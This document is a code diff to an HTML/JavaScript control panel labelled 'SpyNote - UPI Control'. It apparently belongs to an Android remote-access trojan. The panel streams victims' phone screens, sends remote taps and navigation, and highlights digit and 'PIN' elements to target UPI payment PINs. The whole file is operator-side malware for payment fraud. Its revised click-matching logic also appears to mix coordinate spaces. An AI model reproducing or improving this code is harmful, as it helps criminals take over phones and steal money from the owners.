@@ -3,7 +3,7 @@
 <head>
     <title>📱 SpyNote - UPI Control</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <script src="/socket.io/socket.io.js"></script>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -83,7 +83,6 @@
     <div id="controls">
         <button onclick="sendBack()">🔙 Back</button>
         <button onclick="sendHome()">🏠 Home</button>
-        <button onclick="toggleRecent()">📋 Recent</button>
         <button class="layout-toggle" onclick="toggleLayout()" id="layoutBtn">🗺️ Layout</button>
         <button onclick="toggleFullScreen()">📱 Full</button>
     </div>
@@ -98,7 +97,6 @@
         let showLayout = false;
         let layoutElements = [];
         let canvas, ctx, overlayCtx, phoneFrame;
-        let pingInterval;
 
         canvas = document.getElementById('screen-canvas');
         overlayCtx = document.getElementById('layout-overlay').getContext('2d');
@@ -107,20 +105,10 @@
         socket.on('connect', () => {
             document.getElementById('status').textContent = '🟢 LIVE';
             document.getElementById('status').style.color = '#00ff88';
-            pingInterval = setInterval(() => {
-                socket.emit('ping');
-                document.getElementById('ping').textContent = `${socket.io.engine.pingTimeout/1000}s`;
-            }, 1000);
-        });
-
-        socket.on('pong', (latency) => {
-            document.getElementById('ping').textContent = `${latency}ms`;
         });
 
         socket.on('devices-update', (devices) => {
             updateDeviceList(devices);
-            deviceWidth = devices[0]?.[1]?.width || 1080;
-            deviceHeight = devices[0]?.[1]?.height || 2400;
         });
 
         socket.on('screen-update', (data) => {
@@ -165,29 +153,29 @@
             };
             
             img.src = `data:image/jpeg;base64,${data.data}`;
+            deviceWidth = data.width || 1080;
+            deviceHeight = data.height || 2400;
         }
 
         function renderLayoutOverlay(layout, rect) {
             overlayCtx.clearRect(0, 0, canvas.width, canvas.height);
             layoutElements = [];
             
-            layout.forEach((element) => {
+            layout.forEach((element, index) => {
                 const x = (element.bounds.left / deviceWidth) * rect.width;
                 const y = (element.bounds.top / deviceHeight) * rect.height;
                 const w = ((element.bounds.right - element.bounds.left) / deviceWidth) * rect.width;
                 const h = ((element.bounds.bottom - element.bounds.top) / deviceHeight) * rect.height;
                 
-                const isPin = element.text?.match(/\d/) || element.contentDesc?.match(/\d/) || 
-                             element.text?.toLowerCase().includes('pin') ||
-                             element.className?.includes('button');
+                const isPin = element.text && (element.text.match(/\d/) || element.contentDescription?.match(/\d/));
                 
                 overlayCtx.fillStyle = isPin ? 'rgba(255,100,100,0.4)' : 'rgba(0,255,136,0.3)';
                 overlayCtx.strokeStyle = isPin ? '#ff6666' : '#00ff88';
-                overlayCtx.lineWidth = 2;
+                overlayCtx.lineWidth = 3;
                 overlayCtx.strokeRect(x, y, w, h);
-                overlayCtx.font = '12px monospace';
+                overlayCtx.font = 'bold 14px monospace';
                 overlayCtx.fillStyle = isPin ? '#ff6666' : '#00ff88';
-                overlayCtx.fillText(`${element.text?.slice(0,8) || element.contentDesc?.slice(0,8) || ''}`, x+5, y+20);
+                overlayCtx.fillText(`${element.text?.slice(0,8) || element.contentDescription?.slice(0,8) || ''}`, x+5, y+22);
                 
                 layoutElements.push({ x, y, w, h, isPin, element });
             });
@@ -274,7 +262,6 @@
 
         function sendBack() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'back' }); }
         function sendHome() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'home' }); }
-        function toggleRecent() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'recent' }); }
 
         function toggleLayout() {
             showLayout = !showLayout;
@@ -301,10 +288,8 @@
             const y = (e.clientY - rect.top) * (deviceHeight / rect.height);
             
             const clickedElement = layoutElements.find(el => 
-                x >= el.x * (deviceWidth / rect.width) && 
-                x <= (el.x + el.w) * (deviceWidth / rect.width) &&
-                y >= el.y * (deviceHeight / rect.height) && 
-                y <= (el.y + el.h) * (deviceHeight / rect.height)
+                x >= el.x && x <= (el.x + el.w) &&
+                y >= el.y && y <= (el.y + el.h)
             );
             
             if (clickedElement && clickedElement.isPin) {
